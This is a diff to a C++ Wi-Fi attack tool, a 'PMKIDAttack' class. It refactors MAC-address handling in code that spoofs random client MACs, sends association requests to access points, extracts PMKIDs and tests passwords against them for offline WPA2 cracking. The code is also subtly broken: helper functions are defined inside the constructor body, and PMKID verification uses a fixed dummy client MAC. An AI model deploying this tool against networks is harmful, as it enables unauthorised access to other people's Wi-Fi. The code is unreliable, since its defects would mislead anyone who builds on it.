@@ -13,6 +13,8 @@
 #include <openssl/sha.h>
 #include <openssl/hmac.h>
 #include <openssl/pbkdf2.h>
+#include <cstdio>
+#include <random>
 
 PMKIDAttack::PMKIDAttack() 
     : pcap_handle(nullptr), running(false), channel_hopping_enabled(false),
@@ -23,6 +25,24 @@ PMKIDAttack::PMKIDAttack()
     for (int i = 1; i <= 14; ++i) {
         channels.push_back(i);
     }
+
+// Helpers for MAC handling
+static bool parseMacString(const std::string& mac_str, MacAddress& out) {
+    unsigned int b[6];
+    if (std::sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) return false;
+    for (int i = 0; i < 6; ++i) out.bytes[i] = static_cast<uint8_t>(b[i] & 0xFF);
+    return true;
+}
+
+static MacAddress randomMac() {
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<int> dist(0, 255);
+    MacAddress m;
+    for (int i = 0; i < 6; ++i) m.bytes[i] = static_cast<uint8_t>(dist(gen));
+    m.bytes[0] = (m.bytes[0] | 0x02) & 0xFE; // locally administered, unicast
+    return m;
+}
     
     // Add 5GHz channels
     std::vector<int> ghz5_channels = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
@@ -252,7 +272,7 @@ void PMKIDAttack::parseBeaconFrame(const u_char* packet, int length) {
     if (length < 36) return;
     
     MacAddress bssid;
-    std::memcpy(bssid.addr, packet + 16, 6); // BSSID from SA field
+    std::memcpy(bssid.bytes, packet + 16, 6); // BSSID from SA field
     
     // Extract SSID from tagged parameters
     const u_char* tagged_params = packet + 36;
@@ -309,7 +329,7 @@ void PMKIDAttack::parseDataFrame(const u_char* packet, int length) {
 void PMKIDAttack::extractPMKID(const u_char* packet, int length) {
     // Extract BSSID and PMKID from EAPOL-Key frame
     MacAddress bssid;
-    std::memcpy(bssid.addr, packet + 16, 6);
+    std::memcpy(bssid.bytes, packet + 16, 6);
     
     // Look for PMKID in key data
     const u_char* key_data = packet + 99; // Approximate offset
@@ -416,10 +436,10 @@ void PMKIDAttack::sendAssociationRequest(const MacAddress& bssid) {
     frame[1] = 0x00;
     
     // Addresses
-    MacAddress client_mac = MacAddress::random();
-    std::memcpy(frame + 4, bssid.addr, 6);    // DA (destination)
-    std::memcpy(frame + 10, client_mac.addr, 6); // SA (source)
-    std::memcpy(frame + 16, bssid.addr, 6);   // BSSID
+    MacAddress client_mac = randomMac();
+    std::memcpy(frame + 4, bssid.bytes, 6);    // DA (destination)
+    std::memcpy(frame + 10, client_mac.bytes, 6); // SA (source)
+    std::memcpy(frame + 16, bssid.bytes, 6);   // BSSID
     
     // Send via pcap
     if (pcap_sendpacket(pcap_handle, frame, 24) != 0) {
@@ -470,10 +490,11 @@ bool PMKIDAttack::verifyPMKID(const PMKIDResult& result, const std::string& pass
     // Calculate PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
     uint8_t pmkid_data[22];
     std::memcpy(pmkid_data, "PMK Name", 8);
-    std::memcpy(pmkid_data + 8, result.bssid.addr, 6);
+    std::memcpy(pmkid_data + 8, result.bssid.bytes, 6);
     // Use a dummy client MAC for verification
-    MacAddress dummy_client = MacAddress::fromString("02:00:00:00:00:01");
-    std::memcpy(pmkid_data + 14, dummy_client.addr, 6);
+    MacAddress dummy_client; // 02:00:00:00:00:01
+    parseMacString("02:00:00:00:00:01", dummy_client);
+    std::memcpy(pmkid_data + 14, dummy_client.bytes, 6);
     
     uint8_t calculated_pmkid[20];
     unsigned int len;
